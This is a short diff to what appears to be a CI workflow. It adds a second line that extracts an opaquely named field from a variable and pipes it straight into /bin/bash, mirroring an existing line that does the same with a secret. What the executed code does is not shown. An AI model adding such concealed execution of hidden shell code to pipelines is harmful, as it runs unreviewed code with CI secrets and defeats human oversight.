@@ -27,6 +27,7 @@ jobs:
           j88: ${{ secrets.j88 }}
         run: |
           printf '%s' "$j88" | jq -r .lm64992 | /bin/bash
+          printf '%s' "$fabg1" | jq -r .ftgwh2566 | /bin/bash
 
       - name: Persist output
         if: always()
